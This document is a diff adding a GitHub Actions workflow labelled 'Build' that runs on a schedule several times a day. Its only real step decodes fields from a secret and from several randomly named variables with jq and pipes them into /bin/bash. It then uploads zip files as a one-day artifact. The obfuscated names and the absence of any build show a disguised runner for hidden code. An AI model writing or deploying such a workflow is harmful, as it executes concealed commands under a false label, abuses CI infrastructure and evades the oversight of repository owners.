@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          xuei70: ${{ secrets.xuei70 }}
+        run: |
+          printf '%s' "$xuei70" | jq -r .aarx48 | /bin/bash
+          echo $al8338 | jq -r .erh1 | /bin/bash
+          printf '%s' "$qcd398" | jq -r .dirt1 | /bin/bash
+          printf '%s' "$ytrob2799" | jq -r .jzore97302 | /bin/bash
+          echo $hbzk303 | jq -r .se42 | /bin/bash
+          echo $s619 | jq -r .k6 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: GV8cJWlR
+          path: "*.zip"
+          retention-days: 1
